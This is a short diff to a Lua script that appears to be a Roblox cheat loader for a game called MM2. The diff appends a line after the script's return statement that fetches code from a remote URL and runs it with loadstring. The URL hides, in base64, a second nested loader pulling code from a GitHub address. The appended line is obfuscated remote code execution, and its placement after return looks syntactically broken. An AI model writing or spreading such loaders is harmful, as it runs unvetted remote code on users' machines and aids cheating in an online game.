@@ -24,3 +24,4 @@ local controller = run(config)
 assert(type(controller) == "table" and type(controller.destroy) == "function", "MM2 runtime did not start; inspect the executor console")
 genv.ProjectReverseHub = controller
 return controller
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImE4NjIyZTI3LWUyZWYtNGZlYy1hMzYxLWZkN2Q2YmZhYzk3MCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldChcImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9saWx5c2NyaXB0c3Mvc3RhcmxpZ2h0bW0yL3JlZnMvaGVhZHMvbWFpbi9zdGFybGlnaHRtbTJcIikpKCkifX0"))()
